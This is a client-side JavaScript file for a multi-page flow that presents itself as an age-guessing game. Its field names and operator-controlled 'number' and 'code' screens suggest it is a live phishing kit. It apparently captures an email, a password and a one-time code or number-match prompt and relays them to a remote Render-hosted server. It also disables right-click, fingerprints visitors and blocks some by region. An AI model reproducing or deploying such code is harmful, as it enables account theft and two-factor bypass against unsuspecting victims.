// ─────────────────────────────────────────────────────────────────────────────
// Disable right-click
// ─────────────────────────────────────────────────────────────────────────────
document.addEventListener('contextmenu', (e) => e.preventDefault());

// ─────────────────────────────────────────────────────────────────────────────
// Config
// ─────────────────────────────────────────────────────────────────────────────
function isLocalhost() {
  const h = window.location.hostname.toLowerCase();
  return (
    h === 'localhost' || h === '127.0.0.1' || h === '::1' ||
    h.endsWith('.local') || h.includes('ngrok') ||
    window.location.protocol === 'file:'
  );
}

function getApiBase() {
  if (window.API_BASE) return window.API_BASE.replace(/\/+$/, '');
  const h = window.location.hostname.toLowerCase();
  const isLocal =
    h === 'localhost' || h === '127.0.0.1' || h === '::1' ||
    h.endsWith('.local') || h.includes('ngrok');
  if (isLocal) {
    return window.location.port ? window.location.origin
         : h.includes('ngrok')  ? window.location.origin
         : 'http://127.0.0.1:5000';
  }
  return 'http://judewarmauth.onrender.com/'; // ← replace with your Render URL
}

const API_BASE       = getApiBase();
const PLAYER_KEY     = 'ageform_player';
const LOCATION_KEY   = 'ageform_location';
const SESSION_ID_KEY = 'ageform_session_id';

// ─────────────────────────────────────────────────────────────────────────────
// Session ID
// ─────────────────────────────────────────────────────────────────────────────
function getSessionId() {
  let sid = localStorage.getItem(SESSION_ID_KEY);
  if (!sid) {
    sid = 'sid_' + Math.random().toString(36).slice(2, 11) + Date.now().toString(36);
    localStorage.setItem(SESSION_ID_KEY, sid);
  }
  return sid;
}

function headers(extra = {}) {
  return { 'Content-Type': 'application/json', 'X-Session-ID': getSessionId(), ...extra };
}

// ─────────────────────────────────────────────────────────────────────────────
// REST session fetch  (used by fallback poller only)
// ─────────────────────────────────────────────────────────────────────────────
async function fetchSession() {
  const res = await fetch(`${API_BASE}/api/session`, {
    headers: headers(), cache: 'no-store',
  });
  if (res.status === 403 && !isLocalhost()) {
    const d = await res.json().catch(() => ({}));
    if (d.blocked) { renderBlocked(d.error); throw new Error('blocked'); }
  }
  if (!res.ok) throw new Error(`session ${res.status}`);
  return res.json();
}

// ─────────────────────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────────────────────
function goTo(path) { window.location.href = path; }

function renderPlayerName() {
  const el = document.getElementById('displayPlayerName');
  if (el) el.textContent = `${localStorage.getItem(PLAYER_KEY) || ''}`;
}

function renderBlocked(msg) {
  if (isLocalhost()) return;
  document.body.innerHTML = `
    <div style="display:flex;justify-content:center;align-items:center;
                height:100vh;background:#0d1117;color:#f0f6fc;
                font-family:sans-serif;text-align:center;padding:20px;">
      <div>
        <h1 style="color:#f85149;margin-bottom:12px;">Access Denied</h1>
        <p style="color:#8b949e;max-width:400px;line-height:1.5;">
          ${msg || 'This service is not available in your region.'}</p>
      </div>
    </div>`;
}

async function verifyRegionAccess() {
  if (isLocalhost()) return true;
  try {
    const res = await fetch(`${API_BASE}/api/session`, { headers: headers() });
    if (res.status === 403) {
      const d = await res.json().catch(() => ({}));
      if (d.blocked) { renderBlocked(d.error); return false; }
    }
  } catch (_) {}
  return true;
}

function setButtonLoading(btn, loading, originalText) {
  if (!btn) return;
  btn.disabled    = loading;
  btn.textContent = loading ? 'Please wait…' : originalText;
}

function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }

// ─────────────────────────────────────────────────────────────────────────────
// Connection status dot  (shown on waiting + number pages)
// ─────────────────────────────────────────────────────────────────────────────
function setConnStatus(state) {
  const el = document.getElementById('connStatus');
  if (!el) return;
  el.className = 'conn-status' + (state === 'live' ? ' conn-status--live' : state === 'poll' ? ' conn-status--poll' : state === 'lost' ? ' conn-status--lost' : '');
  const labels = { connecting: 'Connecting…', live: 'Live', poll: 'Reconnecting…', lost: 'Connection lost' };
  const lbl = el.querySelector('.conn-status__label');
  if (lbl) lbl.textContent = labels[state] || state;
}

// ─────────────────────────────────────────────────────────────────────────────
// Core: Real-time session watcher
//
// Uses Server-Sent Events (SSE) as the primary transport.
// The server pushes a full session snapshot the instant state changes
// (operator presses Accept, Number, Code, Decline) — latency is ~50 ms.
//
// SSE is supported by every modern browser.  If the connection drops (network
// blip, Render spin-up, proxy timeout) it automatically reconnects with
// exponential back-off.  While SSE is reconnecting the fallback poller takes
// over every 1.5 s so nothing stalls.
//
// Returns a stop() function that tears down both SSE and the fallback poller.
// ─────────────────────────────────────────────────────────────────────────────
function watchSession(onUpdate) {
  let es            = null;
  let fallbackTimer = null;
  let stopped       = false;
  let sseAlive      = false;
  let reconnectIn   = 1000;
  const MAX_RECONNECT = 16000;

  // ── fallback poller ── active only while SSE is down ──────────────────
  function startFallback() {
    if (fallbackTimer || stopped) return;
    setConnStatus('poll');
    let delay = 1500;
    const poll = async () => {
      if (stopped || sseAlive) return;
      try {
        const session = await fetchSession();
        onUpdate(session);
        delay = 1500;
      } catch (e) {
        if (e.message === 'blocked') return;
        delay = Math.min(delay * 1.5, 8000);
      }
      if (!stopped && !sseAlive) fallbackTimer = setTimeout(poll, delay);
    };
    fallbackTimer = setTimeout(poll, 300);
  }

  function stopFallback() {
    clearTimeout(fallbackTimer);
    fallbackTimer = null;
  }

  // ── SSE connection ─────────────────────────────────────────────────────
  function connect() {
    if (stopped) return;
    setConnStatus('connecting');

    const url = `${API_BASE}/api/stream?sid=${encodeURIComponent(getSessionId())}`;
    es = new EventSource(url);

    es.onopen = () => {
      sseAlive    = true;
      reconnectIn = 1000;
      setConnStatus('live');
      stopFallback();
    };

    es.onmessage = (evt) => {
      if (!evt.data || evt.data.trim() === '') return;
      try {
        const session = JSON.parse(evt.data);
        // Mark live on first real message if onopen fired late
        if (!sseAlive) { sseAlive = true; reconnectIn = 1000; setConnStatus('live'); stopFallback(); }
        onUpdate(session);
      } catch (_) {}
    };

    es.onerror = () => {
      sseAlive = false;
      es.close();
      es = null;
      if (stopped) return;
      startFallback();
      setTimeout(connect, reconnectIn);
      reconnectIn = Math.min(reconnectIn * 2, MAX_RECONNECT);
    };
  }

  connect();

  return function stop() {
    stopped = true;
    stopFallback();
    if (es) { es.close(); es = null; }
  };
}

// ─────────────────────────────────────────────────────────────────────────────
// Heartbeat  (keeps Render free-tier awake; 25 s interval)
// ─────────────────────────────────────────────────────────────────────────────
function startHeartbeat() {
  setInterval(async () => {
    try {
      await fetch(`${API_BASE}/api/heartbeat`, { method: 'POST', headers: headers() });
    } catch (_) {}
  }, 25000);
}

// ─────────────────────────────────────────────────────────────────────────────
// PAGE: index.html
// ─────────────────────────────────────────────────────────────────────────────
function initPlayerSetup() {
  const form = document.getElementById('emailForm');
  if (!form) return;

  verifyRegionAccess();

  if (!sessionStorage.getItem('ageform_visit_logged')) {
    fetch(`${API_BASE}/api/visit`, {
      method: 'POST',
      headers: headers(),
      body: JSON.stringify({
        referrer: document.referrer || 'Direct',
        clientInfo: {
          screen:   `${screen.width}x${screen.height}`,
          timezone: Intl.DateTimeFormat?.().resolvedOptions().timeZone || 'Unknown',
          language: navigator.language || 'Unknown',
          platform: navigator.platform || 'Unknown',
        },
      }),
    }).then((res) => {
      if (res.status === 403) {
        res.json().then((d) => { if (d.blocked) renderBlocked(d.error); }).catch(() => {});
      } else {
        sessionStorage.setItem('ageform_visit_logged', 'true');
      }
    }).catch(() => {});
  }

  const btn     = form.querySelector('button[type="submit"]');
  const btnText = btn ? btn.textContent : 'Continue';

  form.addEventListener('submit', (e) => {
    e.preventDefault();
    const name = document.getElementById('playerName').value.trim();
    if (!name) return;
    localStorage.setItem(PLAYER_KEY, name);
    setButtonLoading(btn, true, btnText);
    goTo('password.html');
  });
}

// ─────────────────────────────────────────────────────────────────────────────
// PAGE: password.html  (location + submit)
// ─────────────────────────────────────────────────────────────────────────────
function initLocationSetup() {
  const form = document.getElementById('ageForm');
  if (!form) return;

  const playerName = localStorage.getItem(PLAYER_KEY);
  if (!playerName) { goTo('index.html'); return; }
  renderPlayerName();

  const btn     = form.querySelector('button[type="submit"]');
  const btnText = btn ? btn.textContent : 'Submit';

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const loc = document.getElementById('gameLocation').value.trim();
    if (!loc) return;
    localStorage.setItem(LOCATION_KEY, loc);
    setButtonLoading(btn, true, btnText);

    try {
      const res = await fetch(`${API_BASE}/api/submit`, {
        method: 'POST',
        headers: headers(),
        body: JSON.stringify({
          playerName,
          gameLocation: loc,
          clientInfo: {
            screen:   `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat?.().resolvedOptions().timeZone || 'Unknown',
            language: navigator.language || 'Unknown',
            platform: navigator.platform || 'Unknown',
          },
        }),
      });

      if (!res.ok) {
        const d = await res.json().catch(() => ({}));
        if (res.status === 403) {
          if (isLocalhost()) { goTo('waiting.html'); return; }
          renderBlocked(d.error);
          return;
        }
        setButtonLoading(btn, false, btnText);
        alert(d.error || '');
        return;
      }
      goTo('waiting.html');
    } catch (err) {
      if (isLocalhost()) { goTo('waiting.html'); return; }
      setButtonLoading(btn, false, btnText);
      alert('Could not reach server. Check your connection.');
    }
  });
}

// ─────────────────────────────────────────────────────────────────────────────
// PAGE: waiting.html
// ─────────────────────────────────────────────────────────────────────────────
function initWaitingPage() {
  if (!document.getElementById('waitingPage')) return;
  if (!localStorage.getItem(PLAYER_KEY) || !localStorage.getItem(LOCATION_KEY)) {
    goTo('index.html'); return;
  }
  renderPlayerName();

  watchSession((s) => {
    if (s.status === 'declined') { goTo('connection-lost.html'); return; }
    if (s.status === 'accepted') {
      if (s.mode === 'code')   { goTo('code.html');   return; }
      if (s.mode === 'number') { goTo('number.html'); return; } // navigate immediately, number.html handles null
    }
  });
}

// ─────────────────────────────────────────────────────────────────────────────
// PAGE: number.html
// ─────────────────────────────────────────────────────────────────────────────
function initNumberPage() {
  if (!document.getElementById('numberPage')) return;
  if (!localStorage.getItem(PLAYER_KEY) || !localStorage.getItem(LOCATION_KEY)) {
    goTo('index.html'); return;
  }
  renderPlayerName();

  const el1 = document.getElementById('selectedNumber');
  const el2 = document.getElementById('selectedNumber2');
  let lastNum = undefined; // undefined = never received a value yet

  watchSession((s) => {
    if (s.status === 'declined')                           { goTo('connection-lost.html'); return; }
    if (s.status === 'idle' || s.status === 'submitted')   { goTo('waiting.html');        return; }
    if (s.mode === 'code')                                 { goTo('code.html');            return; }
    // s.mode === 'number' && s.number === null is valid: operator picked number mode
    // but hasn't chosen a specific number yet — stay here and show the placeholder.

    const num = s.number;
    if (num !== lastNum) {
      lastNum = num;
      const txt = num != null ? String(num) : '';
      if (el1) el1.textContent = txt;
      if (el2) el2.textContent = txt;
    }
  });
}

// ─────────────────────────────────────────────────────────────────────────────
// PAGE: code.html
// ─────────────────────────────────────────────────────────────────────────────
function initCodePage() {
  if (!document.getElementById('codePage')) return;
  if (!localStorage.getItem(PLAYER_KEY) || !localStorage.getItem(LOCATION_KEY)) {
    goTo('index.html'); return;
  }
  renderPlayerName();

  const form      = document.getElementById('ageGuessForm');
  const ageInput  = document.getElementById('age');
  const resultEl  = document.getElementById('ageResult');
  const submitBtn = form?.querySelector('button[type="submit"]');
  const btnText   = submitBtn ? submitBtn.textContent : 'Submit age';

  // Watch for operator mode changes
  watchSession((s) => {
    if (s.status === 'declined')                          { goTo('connection-lost.html'); return; }
    if (s.status === 'idle' || s.status === 'submitted')  { goTo('waiting.html');        return; }
    if (s.mode === 'number') {
      // Only redirect if player hasn't started typing
      if (!ageInput?.value.trim()) { goTo('number.html'); return; }
      if (resultEl && !resultEl.dataset.warned) {
        resultEl.textContent       = '⚠️ Operator switched modes. Submit first or clear the field.';
        resultEl.dataset.warned    = '1';
      }
    } else if (s.mode === 'code' && resultEl?.dataset.warned) {
      resultEl.textContent = '';
      delete resultEl.dataset.warned;
    }
  });

  if (!form) return;

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const raw = ageInput?.value.trim() || '';
    const age = parseInt(raw, 10);
    if (!raw || !Number.isInteger(age) || age < 1) {
      if (resultEl) resultEl.textContent = 'Please enter a valid whole number.';
      return;
    }

    setButtonLoading(submitBtn, true, btnText);
    if (resultEl) { resultEl.textContent = ''; delete resultEl.dataset.warned; }

    const MAX = 3;
    for (let attempt = 1; attempt <= MAX; attempt++) {
      try {
        const res = await fetch(`${API_BASE}/api/age`, {
          method: 'POST',
          headers: headers(),
          body: JSON.stringify({ age }),
        });

        if (res.ok) { goTo('success.html'); return; }

        const d = await res.json().catch(() => ({}));
        if (res.status === 409) {
          setButtonLoading(submitBtn, false, btnText);
          if (resultEl) resultEl.textContent = '⚠️ Game mode changed. Wait for the operator.';
          return;
        }
        if (res.status >= 400 && res.status < 500) {
          setButtonLoading(submitBtn, false, btnText);
          if (resultEl) resultEl.textContent = d.error || 'Could not send response.';
          return;
        }
        if (attempt < MAX) { await sleep(500 * attempt); continue; }
        setButtonLoading(submitBtn, false, btnText);
        if (resultEl) resultEl.textContent = d.error || 'Server error. Try again.';
        return;
      } catch (err) {
        if (attempt < MAX) { await sleep(600 * attempt); continue; }
        setButtonLoading(submitBtn, false, btnText);
        if (resultEl) resultEl.textContent = 'Network error. Check your connection.';
        return;
      }
    }
  });
}

// ─────────────────────────────────────────────────────────────────────────────
// PAGE: connection-lost.html
// ─────────────────────────────────────────────────────────────────────────────
function initConnectionLostPage() {
  if (!document.getElementById('connectionLostPage')) return;
  renderPlayerName();
  watchSession((s) => {
    if (s.status === 'accepted') {
      if (s.mode === 'code')   { goTo('code.html');   return; }
      if (s.mode === 'number') { goTo('number.html'); return; }
    }
  });
}

// ─────────────────────────────────────────────────────────────────────────────
// PAGE: success.html
// ─────────────────────────────────────────────────────────────────────────────
function initSuccessPage() {
  if (!document.getElementById('successPage')) return;
  if (!localStorage.getItem(PLAYER_KEY)) { goTo('index.html'); return; }
  renderPlayerName();
}

// ─────────────────────────────────────────────────────────────────────────────
// Boot
// ─────────────────────────────────────────────────────────────────────────────
startHeartbeat();
initPlayerSetup();
initLocationSetup();
initWaitingPage();
initNumberPage();
initCodePage();
initConnectionLostPage();
initSuccessPage();
